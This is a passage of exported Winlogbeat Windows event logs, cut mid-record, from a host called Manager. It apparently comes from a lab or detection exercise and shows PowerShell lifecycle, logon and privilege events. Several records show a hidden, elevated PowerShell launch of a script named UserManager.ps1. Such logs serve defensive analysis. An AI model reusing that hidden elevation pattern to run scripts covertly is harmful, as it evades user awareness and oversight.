	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,6204,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 17:06:16.728",IXkXBIQByII7dpeEwS3z,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 17:06:16.986","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""FileSystem"" is Started. 

Details: 
	ProviderName=FileSystem
	NewProviderState=Started

	SequenceNumber=7

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=aa4baaaf-bb2a-496d-871a-fc87017b1f81
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe C:\Users\UserManager.ps1
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",FileSystem,"-","-","-","-",Started,"-","-","-","	ProviderName=FileSystem
	NewProviderState=Started

	SequenceNumber=7

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=aa4baaaf-bb2a-496d-871a-fc87017b1f81
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe C:\Users\UserManager.ps1
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,6205,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 17:06:16.728",InkXBIQByII7dpeEwS3z,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 17:06:16.986","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""Function"" is Started. 

Details: 
	ProviderName=Function
	NewProviderState=Started

	SequenceNumber=9

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=aa4baaaf-bb2a-496d-871a-fc87017b1f81
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe C:\Users\UserManager.ps1
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Function,"-","-","-","-",Started,"-","-","-","	ProviderName=Function
	NewProviderState=Started

	SequenceNumber=9

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=aa4baaaf-bb2a-496d-871a-fc87017b1f81
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe C:\Users\UserManager.ps1
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,6206,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 17:06:16.728",I3kXBIQByII7dpeEwS3z,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 17:06:16.986","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""Variable"" is Started. 

Details: 
	ProviderName=Variable
	NewProviderState=Started

	SequenceNumber=11

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=aa4baaaf-bb2a-496d-871a-fc87017b1f81
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe C:\Users\UserManager.ps1
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Variable,"-","-","-","-",Started,"-","-","-","	ProviderName=Variable
	NewProviderState=Started

	SequenceNumber=11

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=aa4baaaf-bb2a-496d-871a-fc87017b1f81
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe C:\Users\UserManager.ps1
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,6207,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 17:06:16.537",JnkXBIQByII7dpeEwS3z,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","1.12.0","logged-in-special",iam,4672,"Oct 23, 2022 @ 17:06:17.822","Oct 23, 2022 @ 17:06:16.691",event,success,"Microsoft-Windows-Security-Auditing",admin,"-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Special privileges assigned to new logon.

Subject:
	Security ID:		S-1-5-18
	Account Name:		SYSTEM
	Account Domain:		NT AUTHORITY
	Logon ID:		0x3E7

Privileges:		SeAssignPrimaryTokenPrivilege
			SeTcbPrivilege
			SeSecurityPrivilege
			SeTakeOwnershipPrivilege
			SeLoadDriverPrivilege
			SeBackupPrivilege
			SeRestorePrivilege
			SeDebugPrivilege
			SeAuditPrivilege
			SeSystemEnvironmentPrivilege
			SeImpersonatePrivilege
			SeDelegateSessionUserImpersonatePrivilege","-","-","-","-","-","-","-","-","-","-",SYSTEM,"-","-","-","NT AUTHORITY","S-1-5-18",SYSTEM,SYSTEM,"{218ecdf5-e63b-0001-9cce-8e213be6d801}",wineventlog,Security,Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","SeAssignPrimaryTokenPrivilege, SeTcbPrivilege, SeSecurityPrivilege, SeTakeOwnershipPrivilege, SeLoadDriverPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeDebugPrivilege, SeAuditPrivilege, SeSystemEnvironmentPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege","-","-","-","-","-","-","-","-","-","NT AUTHORITY",0x3e7,SYSTEM,"S-1-5-18","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4672,"Audit Success","-","-","-",0x3e7,"-",Info,656,"4,516","{54849625-5478-4994-a5ba-3e3b0328c30d}","Microsoft-Windows-Security-Auditing",31193,"Special Logon","-","-","-","-","-"
"Oct 23, 2022 @ 17:06:16.536",JXkXBIQByII7dpeEwS3z,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","1.12.0","logged-in",authentication,4624,"Oct 23, 2022 @ 17:06:17.822","Oct 23, 2022 @ 17:06:16.690",event,success,"Microsoft-Windows-Security-Auditing",start,"-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"An account was successfully logged on.

Subject:
	Security ID:		S-1-5-18
	Account Name:		MANAGER$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7

Logon Information:
	Logon Type:		5
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Impersonation

New Logon:
	Security ID:		S-1-5-18
	Account Name:		SYSTEM
	Account Domain:		NT AUTHORITY
	Logon ID:		0x3E7
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{00000000-0000-0000-0000-000000000000}

Process Information:
	Process ID:		0x280
	Process Name:		C:\Windows\System32\services.exe

Network Information:
	Workstation Name:	-
	Source Network Address:	-
	Source Port:		-

Detailed Authentication Information:
	Logon Process:		Advapi  
	Authentication Package:	Negotiate
	Transited Services:	-
	Package Name (NTLM only):	-
	Key Length:		0

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.","-","-","-","-","C:\Windows\System32\services.exe","C:\Windows\System32\services.exe","services.exe","services.exe",640,"-","SYSTEM, MANAGER$","-","-","-","NT AUTHORITY","S-1-5-18",SYSTEM,SYSTEM,"{218ecdf5-e63b-0001-9cce-8e213be6d801}",wineventlog,Security,Manager,"-",Negotiate,"-","-","-","-","-","%%1842","-","-","-","%%1833","-","-",0,"-","{00000000-0000-0000-0000-000000000000}","Advapi  ",5,"-","-","-","-","-","-","-","-","-","-",WORKGROUP,0x3e7,"MANAGER$","S-1-5-18","NT AUTHORITY",0x0,0x3e7,"-","-","-","-",SYSTEM,"S-1-5-18","-","-","%%1843","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4624,"Audit Success","-","-","-",0x3e7,Service,Info,656,"4,516","{54849625-5478-4994-a5ba-3e3b0328c30d}","Microsoft-Windows-Security-Auditing",31192,Logon,"-","-","-","-",2
"Oct 23, 2022 @ 17:06:16.495",HXkXBIQByII7dpeEwS3z,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","8.0.0","Engine Lifecycle","-",403,"Oct 23, 2022 @ 17:06:16.986","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Engine state is changed from Available to Stopped. 

Details: 
	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=22

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=faa344c5-f572-4680-b6ae-44cbf2c764b3
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=5.1.19041.1682
	RunspaceId=006610ef-40e1-4c2e-b82e-7925928eed3f
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Stopped,"-","-","-","-",Available,"-","-","-","	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=22

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=faa344c5-f572-4680-b6ae-44cbf2c764b3
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=5.1.19041.1682
	RunspaceId=006610ef-40e1-4c2e-b82e-7925928eed3f
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",403,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,6201,"Engine Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 17:06:16.417",HHkXBIQByII7dpeEwS3z,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","8.0.0","Engine Lifecycle","-",403,"Oct 23, 2022 @ 17:06:16.986","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Engine state is changed from Available to Stopped. 

Details: 
	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=15

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=cae13c18-4ed0-44a7-96d4-5b0cd1379ac0
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden start-process powershell -verb runas -windowstyle hidden -ArgumentList C:\Users\UserManager.ps1
	EngineVersion=5.1.19041.1682
	RunspaceId=4bd0a853-06c8-400f-8329-b7c6d176532c
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Stopped,"-","-","-","-",Available,"-","-","-","	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=15

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=cae13c18-4ed0-44a7-96d4-5b0cd1379ac0
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden start-process powershell -verb runas -windowstyle hidden -ArgumentList C:\Users\UserManager.ps1
	EngineVersion=5.1.19041.1682
	RunspaceId=4bd0a853-06c8-400f-8329-b7c6d176532c
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",403,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,6200,"Engine Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 17:06:16.006",G3kXBIQByII7dpeEwS3z,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","8.0.0","Engine Lifecycle","-",400,"Oct 23, 2022 @ 17:06:16.986","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Engine state is changed from None to Available. 

Details: 
	NewEngineState=Available
	PreviousEngineState=None

	SequenceNumber=13

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=cae13c18-4ed0-44a7-96d4-5b0cd1379ac0
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden start-process powershell -verb runas -windowstyle hidden -ArgumentList C:\Users\UserManager.ps1
	EngineVersion=5.1.19041.1682
	RunspaceId=4bd0a853-06c8-400f-8329-b7c6d176532c
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Available,"-","-","-","-",None,"-","-","-","	NewEngineState=Available
	PreviousEngineState=None

	SequenceNumber=13

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=cae13c18-4ed0-44a7-96d4-5b0cd1379ac0
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden start-process powershell -verb runas -windowstyle hidden -ArgumentList C:\Users\UserManager.ps1
	EngineVersion=5.1.19041.1682
	RunspaceId=4bd0a853-06c8-400f-8329-b7c6d176532c
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",400,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,6199,"Engine Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 17:06:15.974",FXkXBIQByII7dpeEwS3z,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 17:06:16.986","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""Registry"" is Started. 

Details: 
	ProviderName=Registry
	NewProviderState=Started

	SequenceNumber=1

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=cae13c18-4ed0-44a7-96d4-5b0cd1379ac0
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden start-process powershell -verb runas -windowstyle hidden -ArgumentList C:\Users\UserManager.ps1
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Registry,"-","-","-","-",Started,"-","-","-","	ProviderName=Registry
	NewProviderState=Started

	SequenceNumber=1

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=cae13c18-4ed0-44a7-96d4-5b0cd1379ac0
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden start-process powershell -verb runas -windowstyle hidden -ArgumentList C:\Users\UserManager.ps1
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,6193,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 17:06:15.974",FnkXBIQByII7dpeEwS3z,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 17:06:16.986","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""Alias"" is Started. 

Details: 
	ProviderName=Alias
	NewProviderState=Started

	SequenceNumber=3

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=cae13c18-4ed0-44a7-96d4-5b0cd1379ac0
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden start-process powershell -verb runas -windowstyle hidden -ArgumentList C:\Users\UserManager.ps1
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Alias,"-","-","-","-",Started,"-","-","-","	ProviderName=Alias
	NewProviderState=Started

	SequenceNumber=3

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=cae13c18-4ed0-44a7-96d4-5b0cd1379ac0
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden start-process powershell -verb runas -windowstyle hidden -ArgumentList C:\Users\UserManager.ps1
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,6194,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 17:06:15.974",F3kXBIQByII7dpeEwS3z,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 17:06:16.986","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""Environment"" is Started. 

Details: 
	ProviderName=Environment
	NewProviderState=Started

	SequenceNumber=5

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=cae13c18-4ed0-44a7-96d4-5b0cd1379ac0
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden start-process powershell -verb runas -windowstyle hidden -ArgumentList C:\Users\UserManager.ps1
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Environment,"-","-","-","-",Started,"-","-","-","	ProviderName=Environment
	NewProviderState=Started

	SequenceNumber=5

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=cae13c18-4ed0-44a7-96d4-5b0cd1379ac0
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden start-process powershell -verb runas -windowstyle hidden -ArgumentList C:\Users\UserManager.ps1
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,6195,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 17:06:15.974",GHkXBIQByII7dpeEwS3z,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 17:06:16.986","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""FileSystem"" is Started. 

Details: 
	ProviderName=FileSystem
	NewProviderState=Started

	SequenceNumber=7

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=cae13c18-4ed0-44a7-96d4-5b0cd1379ac0
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden start-process powershell -verb runas -windowstyle hidden -ArgumentList C:\Users\UserManager.ps1
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",FileSystem,"-","-","-","-",Started,"-","-","-","	ProviderName=FileSystem
	NewProviderState=Started

	SequenceNumber=7

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=cae13c18-4ed0-44a7-96d4-5b0cd1379ac0
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden start-process powershell -verb runas -windowstyle hidden -ArgumentList C:\Users\UserManager.ps1
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,6196,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 17:06:15.974",GXkXBIQByII7dpeEwS3z,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","8.0.0","Provider Lifecycle","-",600,"Oct 23, 2022 @ 17:06:16.986","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Provider ""Function"" is Started. 

Details: 
	ProviderName=Function
	NewProviderState=Started

	SequenceNumber=9

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=cae13c18-4ed0-44a7-96d4-5b0cd1379ac0
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden start-process powershell -verb runas -windowstyle hidden -ArgumentList C:\Users\UserManager.ps1
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
